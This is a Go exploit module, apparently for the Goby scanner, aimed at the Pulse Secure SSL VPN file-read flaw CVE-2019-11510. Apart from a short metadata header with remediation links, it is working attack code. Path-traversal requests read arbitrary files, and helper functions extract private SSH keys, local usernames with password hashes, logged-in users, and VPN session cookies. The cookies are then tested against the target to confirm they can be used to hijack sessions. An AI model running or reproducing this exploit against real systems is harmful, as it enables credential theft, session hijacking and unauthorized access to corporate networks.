package exploits

import (
	"bufio"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Pulse Secure SSL VPN file reading vulnerability (CVE-2019-11510)",
    "Description": "<p>Pulse Secure Connect is developed by Pulse Secure and uses VPN technology to establish a secure encryption tunnel, allowing users to securely access company resources on the Internet through various devices such as computers, smartphones, and tablets.</p><p>Attackers can exploit this vulnerability to obtain sensitive information about the affected system, including usernames, passwords, and session tokens. This allows attackers to remotely access the system as legitimate users and perform unauthorized operations.</p>",
    "Product": "PulseSecure-SSL-VPN",
    "Homepage": "https://www.pulsesecure.net",
    "DisclosureDate": "2019-05-08",
    "PostTime": "2023-12-25",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"href=\\\"/dana-na\" && body=\"src=\\\"/dana-na/imgs/\"",
    "GobyQuery": "body=\"href=\\\"/dana-na\" && body=\"src=\\\"/dana-na/imgs/\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit this vulnerability to obtain sensitive information about the affected system, including usernames, passwords, and session tokens. This allows attackers to remotely access the system as legitimate users and perform unauthorized operations.</p>",
    "Recommendation": "<p>1. Please upgrade the system to the latest version, the manufacturer has fixed the vulnerability: <a href=\"https://kb.pulsesecure.net/articles/pulse_security_advisories/sa44101\">https://kb.pulsesecure.net/articles/pulse_security_advisories/sa44101</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [
        "https://blog.detectify.com/industry-insights/cve-2019-11510-developing-exploitable-payload-file-disclosure-pulse-secure-connect/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "readFile,getVersion,getHosts,getConfigurationInformation,getObservedLogins,getUserSession,getAll",
            "show": ""
        },
        {
            "name": "readFile",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=readFile"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2019-11510"
    ],
    "CNNVD": [
        "CNNVD-201904-1243"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "Pulse Secure SSL VPN 文件读取漏洞 （CVE-2019-11510）",
            "Product": "PulseSecure-SSL-VPN",
            "Description": "<p>Pulse Secure Connect 它由Pulse Secure开发，通过VPN技术建立安全的加密隧道，使用户可以在互联网上通过各种设备（如计算机、智能手机和平板电脑）安全地访问公司资源。</p><p>攻击者可以利用该漏洞获取受影响系统的敏感信息，包括用户名、密码和会话令牌等。这使得攻击者可以以合法用户的身份远程访问系统，并执行未经授权的操作。</p>",
            "Recommendation": "<p>1、请升级系统到最新版本，厂商已经修复漏洞：<a href=\"https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101\">https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可以利用该漏洞获取受影响系统的敏感信息，包括用户名、密码和会话令牌等。这使得攻击者可以以合法用户的身份远程访问系统，并执行未经授权的操作。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Pulse Secure SSL VPN file reading vulnerability (CVE-2019-11510)",
            "Product": "PulseSecure-SSL-VPN",
            "Description": "<p>Pulse Secure Connect is developed by Pulse Secure and uses VPN technology to establish a secure encryption tunnel, allowing users to securely access company resources on the Internet through various devices such as computers, smartphones, and tablets.</p><p>Attackers can exploit this vulnerability to obtain sensitive information about the affected system, including usernames, passwords, and session tokens. This allows attackers to remotely access the system as legitimate users and perform unauthorized operations.</p>",
            "Recommendation": "<p>1. Please upgrade the system to the latest version, the manufacturer has fixed the vulnerability: <a href=\"https://kb.pulsesecure.net/articles/pulse_security_advisories/sa44101\">https://kb.pulsesecure.net/articles/pulse_security_advisories/sa44101</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to obtain sensitive information about the affected system, including usernames, passwords, and session tokens. This allows attackers to remotely access the system as legitimate users and perform unauthorized operations.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10934"
}`
	// 验证 Cookies 有效性
	verifyThatCookiesbmsnaijio837812bd := func(hostInfo *httpclient.FixUrl, session string) (bool, error) {
		verifyRequestConfig := httpclient.NewGetRequestConfig("/")
		verifyRequestConfig.VerifyTls = false
		verifyRequestConfig.Header.Store("Cookie", "DSID="+session)
		resp, err := httpclient.DoHttpRequest(hostInfo, verifyRequestConfig)
		if err != nil {
			return false, err
		} else if strings.Contains(resp.Utf8Html, "Overall Appliance Statistics") {
			return true, nil
		}
		return false, err
	}

	// 位置提取
	runStringsCommanddasd783712837182ajsdhj := func(configPath, pattern string, contextLines int, matchKey string, keyStart, keyEnd int) string {
		lines := strings.Split(configPath, "\n")
		for i, line := range lines {
			if strings.Contains(line, pattern) {
				for j := i; j < i+contextLines+1 && j < len(lines); j++ {
					if strings.Contains(lines[j], matchKey) {
						if keyEnd == 0 {
							return lines[j][keyStart:]
						} else {
							return lines[j][keyStart:keyEnd]
						}
					}
				}
			}
		}
		return ""
	}

	// 从二进制文件里面提取用户和密码
	getLocalUsersdasdasdasdas312bnnjb := func(resp *httpclient.HttpResponse, hostInfo *httpclient.FixUrl) string {
		lines := strings.Split(resp.Utf8Html, "\n")

		// 去掉重复的
		user := make(map[string]bool) // 使用map进行去重和替换
		for _, line := range lines {

			// 匹配那行有 login_ 头内容
			if strings.Contains(line, "login_") {

				// 提取login_xxx的内容
				matches := regexp.MustCompile(`login_[\w.]+`).FindAllString(line, -1)

				// 去掉重复的 login_
				for _, match := range matches {
					trimmedMatch := match[len("login_"):]
					user[trimmedMatch] = true
				}
			}
		}
		if len(user) > 40 {
			return "The processing time may be longer. Please download and check it yourself\nAddress： " + hostInfo.FixedHostInfo + "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/"
		}
		var localUserDetails string
		var recordUsers = 0
		for userName := range user {
			// 获取能够读取的明文数据
			obtainingReadableData := regexp.MustCompile(`[^a-zA-Z0-9_$\n\s-.]`).ReplaceAllString(resp.Utf8Html, " ")

			processed := ""
			lines = strings.Split(obtainingReadableData, "\n")
			for _, line := range lines {
				if strings.Contains(line, "login_") {
					// 过滤脏字符
					reSpaces := strings.Split(line, " ")
					for _, linea := range reSpaces {
						if len(linea) > 3 {
							processed += linea + "\n"
						}
					}
				}
			}
			recordUsers += 1
			uniqueId := runStringsCommanddasd783712837182ajsdhj(processed, fmt.Sprintf("login_%s", userName), 4, "useruid", 7, 47)
			passwordHash := runStringsCommanddasd783712837182ajsdhj(processed, userName, 10, "danastre", 0, 0)
			localUserDetails += "\n==================\nUsername: " + userName + "\nUnique ID：" + uniqueId + "\nPassword Hash (md5crypt)：" + passwordHash
		}
		return localUserDetails
	}

	// 从二进制文件里面提取cookie
	getSessionsdsa783219dsadas := func(hostInfo *httpclient.FixUrl, resp *httpclient.HttpResponse) string {

		readableContent := regexp.MustCompile(`[^a-zA-Z0-9]`).ReplaceAllString(resp.Utf8Html, " ")

		obtainingReadableData := ""
		//fmt.Println(result)
		lines := strings.Split(readableContent, "\n")
		for _, line := range lines {
			reSpaces := strings.Split(line, " ")
			for _, linea := range reSpaces {
				if len(linea) > 3 {
					obtainingReadableData += linea + "\n"
				}
			}
		}

		sessionCookies := ""
		uniquePairs := make(map[string]bool)

		scanner := bufio.NewScanner(strings.NewReader(obtainingReadableData))

		for scanner.Scan() {
			line := scanner.Text()
			fields := strings.Fields(line)

			for _, field := range fields {
				if len(field) > 3 && strings.Contains(field, "randomVal") && len(field) > 12 && len(field[9:]) == 32 {
					cookies := field[9:]

					// 读取下一行
					scanner.Scan()
					line2 := scanner.Text()

					if len(line2) > 6 && strings.Contains(line2, "sid") && len(line2[3:43]) == 40 {
						sid := line2[3:43]
						pair := fmt.Sprintf("%s:%s", cookies, sid)

						// 如果标识符未出现过，则添加到结果字符串中，并记录该标识符
						if !uniquePairs[pair] {
							verifyCookies, err := verifyThatCookiesbmsnaijio837812bd(hostInfo, cookies)
							if verifyCookies && err == nil {
								sessionCookies += fmt.Sprintf("Cookies: DSID=%s \n sid: %s\n", cookies, sid)
							}
							uniquePairs[pair] = true
						}
					}
				}
			}
		}
		return sessionCookies
	}

	fileReadingdas7678da := func(hostInfo *httpclient.FixUrl, fileName string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig(fileName)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Timeout = 200
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	//获取版本
	getVersiondsad312312as := func(hostInfo *httpclient.FixUrl) (string, string, error) {
		resp, err := fileReadingdas7678da(hostInfo, "/dana-na/nc/nc_gina_ver.txt")
		if err != nil {
			return "", "", err
		}
		matches := regexp.MustCompile(`PARAM NAME="ProductVersion" VALUE="([^"]+)"`).FindStringSubmatch(resp.Utf8Html)
		if len(matches) >= 1 {
			return matches[1], resp.Utf8Html, nil
		}
		return "", "", errors.New("漏洞利用失败")
	}

	// 提取 VPN 配置详细信息
	extractConfigurationDetailshjkjk878asd := func(resp *httpclient.HttpResponse, hostInfo *httpclient.FixUrl) string {
		var information string

		// 匹配 ssh 秘钥
		sshKeys := regexp.MustCompile(`(?s)(-----BEGIN PRIVATE KEY-----.*?-----END PRIVATE KEY-----)`).FindAllString(resp.Utf8Html, -1)
		// 可能有多个

		information += "\nSSH keys：\n"
		if len(sshKeys) < 1 {
			information += "Utilization failure！"
		}
		for _, sshKey := range sshKeys {
			if len(sshKey) > 1 {
				information += sshKey + "\n"
			} else {
				information += "Utilization failure！"
			}
		}

		// 提取用户和密码
		userInformation := getLocalUsersdasdasdasdas312bnnjb(resp, hostInfo)
		if len(userInformation) > 2 {
			information += "\nLocal User Details：\n" + userInformation
		} else {
			information += "\nLocal User Details：\n" + "Utilization failure！"
		}

		return information
	}

	// 获取已经登录的信息
	observedLoginsdhjdjhas73821has := func(resp *httpclient.HttpResponse) (string, string) {
		// 提取二进制文件里面内容
		readableContent := regexp.MustCompile(`[^a-zA-Z0-9@:./(");_-]`).ReplaceAllString(resp.Utf8Html, " ")
		obtainingReadableData := ""
		lines := strings.Split(readableContent, "\n")
		for _, line := range lines {

			// 看见有空格3个的进行循环
			reSpaces := strings.Split(line, "   ")
			for _, linea := range reSpaces {
				if len(linea) > 3 {

					// 如果第一个等于宫格，替换成空，最多替换三个
					if linea[:3] == "   " {
						linea = linea[3:]
					}
					if linea[:2] == "  " {
						linea = linea[2:]
					}
					if linea[:1] == " " {
						linea = linea[1:]
					}
					obtainingReadableData += linea + "\n"
				}
			}
		}
		rangeExtraction := ""
		user := regexp.MustCompile(`(?m)^.*user@.*$`).FindAllStringIndex(obtainingReadableData, -1)
		for _, match := range user {
			start := match[0]
			end := match[1]

			rangeExtraction += obtainingReadableData[start:end] + "\n"

			// 输出后35行
			scanner := bufio.NewScanner(strings.NewReader(obtainingReadableData[end:]))
			for i := 0; i < 35 && scanner.Scan(); i++ {
				rangeExtraction += scanner.Text() + "\n"
			}
		}
		// 获取连接用户名和连接时间
		connectedUsers := ""
		uniquePairs := make(map[string]bool)
		lines = strings.Split(rangeExtraction, "\n")
		for _, line := range lines {
			if strings.Contains(line, "(Users)\"") {
				// 匹配用户
				user := regexp.MustCompile(`([^ ]*)\s*\(Users\)`).FindStringSubmatch(line)
				if len(user) > 1 {
					// 日期和时间
					time := regexp.MustCompile(`(\w{3} \w{3} \d{2} \d{2}:\d{2}:\d{2} \d{4})`).FindStringSubmatch(line)
					if len(time) > 1 && !uniquePairs[user[1]] {
						connectedUsers += fmt.Sprintf("Connected Users: %s Connection time: %s\n", user[1], time[1])
						uniquePairs[user[1]] = true
					}
				}
			}
		}
		if connectedUsers == "" {
			connectedUsers = "Not obtained！"
		}
		return connectedUsers, rangeExtraction
	}
	// 获取全部信息
	getAllInformationdsadasnm73281das := func(hostInfo *httpclient.FixUrl) string {
		summarize := ""
		passwd, _ := fileReadingdas7678da(hostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/")
		if !strings.Contains(passwd.Utf8Html, "root:x:0") {
			return ""
		}
		summarize += "\nRead /etc/passwd: \n" + passwd.Utf8Html + "\n"

		getHosts, _ := fileReadingdas7678da(hostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/")
		if strings.Contains(getHosts.Utf8Html, "127.") {
			summarize += "\nRead /etc/hosts: \n" + getHosts.Utf8Html + "\n"
		} else {
			summarize += "\nRead /etc/hosts: Acquisition failed\n"
		}

		version, _, _ := getVersiondsad312312as(hostInfo)
		if len(version) >= 1 {
			summarize += "\nPulse Connect Secure version: " + version + "\n"
		} else {
			summarize += "\nPulse Connect Secure version: Acquisition failed\n"
		}

		hashedCredentials, _ := fileReadingdas7678da(hostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/")
		if strings.Contains(hashedCredentials.Utf8Html, "XXXX") {
			summarize += extractConfigurationDetailshjkjk878asd(hashedCredentials, hostInfo)
		} else {
			summarize += "\n/data/runtime/mtmp/system Acquisition failed\n"
		}
		getObservedLogins, _ := fileReadingdas7678da(hostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/")
		if strings.Contains(getObservedLogins.Utf8Html, "user@") {
			observedLogins, _ := observedLoginsdhjdjhas73821has(getObservedLogins)
			summarize += "\nObserved VPN Logins:\n" + observedLogins + "\n"
		} else {
			summarize += "\n/data/runtime/mtmp/lmdb/dataa/data.mdb Acquisition failed\n"
		}

		getUserSession, _ := fileReadingdas7678da(hostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/")
		if strings.Contains(getUserSession.Utf8Html, "randomVa") {
			cookies := getSessionsdsa783219dsadas(hostInfo, getUserSession)
			if len(cookies) > 2 {
				summarize += "\n VPN Session Cookies: \n" + cookies + "\n"
			} else {
				summarize += "\nVPN Session Cookies:  Acquisition failed\n"
			}
		} else {
			summarize += "\nVPN Session Cookies:  Acquisition failed\n"
		}
		return summarize
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := fileReadingdas7678da(hostinfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/")
			return resp != nil && strings.Contains(resp.Utf8Html, "root:x:0") && resp.StatusCode == 200
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			//attackType := "getObservedLogins"
			if attackType == "readFile" {
				fileName := stepLogs.Params["readFile"].(string)
				resp, err := fileReadingdas7678da(expResult.HostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../.."+fileName+"?/dana/html5acc/guacamole/")
				if err != nil {
					expResult.Output = err.Error()
				} else if !strings.Contains(resp.Utf8Html, "404") && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = strings.ReplaceAll(strings.ReplaceAll(resp.Utf8Html, "<HTML>\n<HEAD>\n</HEAD>\n<BODY BGCOLOR=\"FFFFFF\">", ""), "</ BODY >\n</ HTML >", "")
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "getHosts" {
				getHosts, err := fileReadingdas7678da(expResult.HostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/")
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(getHosts.Utf8Html, "127.") {
					expResult.Success = true
					expResult.Output = "Read /etc/hosts:\n" + getHosts.Utf8Html
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "getConfigurationInformation" {
				hashedCredentials, err := fileReadingdas7678da(expResult.HostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/")
				if err != nil {
					expResult.Output = err.Error()
				} else if hashedCredentials.StatusCode == 200 && strings.Contains(hashedCredentials.Utf8Html, "XXXX") {
					expResult.Success = true
					expResult.Output = extractConfigurationDetailshjkjk878asd(hashedCredentials, expResult.HostInfo)
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "getObservedLogins" {
				getObservedLogins, err := fileReadingdas7678da(expResult.HostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/")
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(getObservedLogins.Utf8Html, "user@") {
					observedLogins, fullDetail := observedLoginsdhjdjhas73821has(getObservedLogins)
					expResult.Success = true
					expResult.Output = "Observed VPN Logins:\n" + observedLogins + "\n" + "\nOther potentially useful information：\n" + fullDetail
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "getUserSession" {
				getUserSession, err := fileReadingdas7678da(expResult.HostInfo, "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/")
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(getUserSession.Utf8Html, "randomVa") {
					cookies := getSessionsdsa783219dsadas(expResult.HostInfo, getUserSession)
					if len(cookies) < 2 {
						expResult.Output = `漏洞利用失败`
						return expResult
					}
					expResult.Success = true
					expResult.Output = cookies
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "getVersion" {
				version, fullDetail, err := getVersiondsad312312as(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
				} else if len(version) >= 1 {
					expResult.Success = true
					expResult.Output = "Pulse Connect Secure version:" + version + "\n full detail：\n" + fullDetail
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "getAll" {
				sensitiveInformation := getAllInformationdsadasnm73281das(expResult.HostInfo)
				if len(sensitiveInformation) > 2 {
					expResult.Success = true
					expResult.Output = sensitiveInformation
				} else {
					expResult.Output = `漏洞利用失败`
				}
			}
			return expResult
		},
	))
}
